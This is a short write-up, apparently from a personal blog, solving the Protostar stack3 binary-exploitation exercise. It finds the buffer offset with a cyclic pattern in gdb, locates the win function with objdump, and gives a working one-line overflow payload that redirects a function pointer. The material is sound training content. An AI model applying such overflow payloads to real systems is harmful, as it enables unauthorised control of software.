---
title: Protostar - Stack3
description: My writeup on stack3 challenge.
categories:
 - binary exploitation
tags: binary exploitation, protostar
---

You can find the protostar there > [Protostar](https://exploit-exercises.lains.space/protostar/){:target="_blank"}

Let's solve this now without the source code.

Let's run the binary first & check what it does.

```bash
user@protostar:/opt/protostar/bin$ ./stack3
pwn
```

Takes a user input,  let's find out if the binary is vulnerable.

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 100' | ./stack3
calling function pointer, jumping to 0x41414141
Segmentation fault
```

`segfault` confirms that binary is vulnerable to buffer overflow.

Let's find now the size of the buffer (exact number of characters that overwrite the EIP)

```bash
$ ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ gdb -q ./stack3
Reading symbols from /opt/protostar/bin/stack3...done.
(gdb) r
Starting program: /opt/protostar/bin/stack3 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
calling function pointer, jumping to 0x63413163

Program received signal SIGSEGV, Segmentation fault.
0x63413163 in ?? ()

$ ./pattern_offset.rb -q 0x63413163
[*] Exact match at offset 64
```

Perfect, if we run `objdump` we can see the `win` function :

```bash
user@protostar:/opt/protostar/bin$ objdump -d ./stack3 | grep win
08048424 <win>:
```

`objdump` -> disassembler

We can now build our exploit, we know the buffer `64bytes` & we have the address of the `win` function.

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A" * 64 + "$\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
